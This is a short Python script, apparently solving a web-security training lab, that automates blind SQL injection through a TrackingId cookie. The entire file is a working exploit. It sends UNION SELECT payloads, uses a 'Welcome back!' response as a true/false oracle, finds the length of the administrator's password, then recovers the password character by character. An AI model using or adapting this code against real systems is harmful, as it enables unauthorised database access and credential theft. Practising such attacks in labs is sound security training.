import urllib.parse
import sys
import requests
from bs4 import BeautifulSoup
import time
import string

site = 'ac791f651f062838804d0403003c007a.web-security-academy.net'
url = f'https://{site}/'
valid_chars = string.ascii_lowercase + string.digits


def try_query(query):
    # print(f'Query: {query}')
    mycookies = {'TrackingId': urllib.parse.quote_plus(query)}
    resp = requests.get(url, cookies=mycookies)
    soup = BeautifulSoup(resp.text, 'html.parser')
    return soup.find('div', text='Welcome back!')


def get_pwd_length():
    num = 1
    while True:
        query = f"x' UNION ALL SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
        if not try_query(query):
            num = num + 1
        else:
            return num


def get_pwd_linear(length):
    pwd = ''
    for x in range(length):
        for c in valid_chars:
            query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND password SIMILAR TO '{pwd + c}%'--"
            if try_query(query):
                pwd += c
                print(pwd)
                break
    return pwd


t = time.perf_counter()
l = get_pwd_length()
p = get_pwd_linear(l)
print(f'Done. Found {p}')
print(f'Time elapsed is {time.perf_counter() - t}')